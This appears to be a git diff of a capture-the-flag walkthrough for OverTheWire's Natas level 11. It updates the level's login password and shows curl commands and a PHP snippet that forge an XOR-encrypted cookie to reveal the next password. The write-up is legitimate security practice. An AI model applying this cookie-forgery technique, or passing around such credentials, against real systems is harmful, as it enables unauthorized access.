@@ -10,7 +10,7 @@ ShowToc: false
 | info | value                                       |
 |:-----|--------------------------------------------:|
 | user | `natas11`                                   |
-| pass | `UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk`          |
+| pass | `VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd`          |
 | host | `http://natas11.natas.labs.overthewire.org` |
 
 ## explanation
@@ -118,9 +118,9 @@ explanation about the cookie fields can be found [down below](#curl-cookie-field
 
 ```sh
 curl http://natas11.natas.labs.overthewire.org \
--u natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk \
+-u natas11:VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd \
 --data-urlencode "bgcolor=#ffffff" \ # <-- change this value
--c - | tail -5                       # <-- cookie will differ
+-c -                                 # <-- cookie will differ
 ```
 
 > while the `-d` flag works here, `--data-urlencode` is preferred, as it auto encodes reserved characters like `#`; `-d` requires manual encoding -> `bgcolor=%23cccccc`
@@ -179,15 +179,15 @@ function xor_encrypt($in) {
 }
 
 print base64_encode(xor_encrypt(json_encode(["showpassword" => "yes", "bgcolor" => "#ffffff"])));
-# HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5 
+# HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5
 ```
 
 lastly, send the forged cookie to the server
 
 ```sh
-$ curl http://natas11.natas.labs.overthewire.org \
--u natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk \
--b "data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5" | grep "password"
+curl http://natas11.natas.labs.overthewire.org \
+-u natas11:VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd \
+-b "data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5"
 ```
 
 hell is like i expected it to be, a bunch of php bullshit (¬_¬")
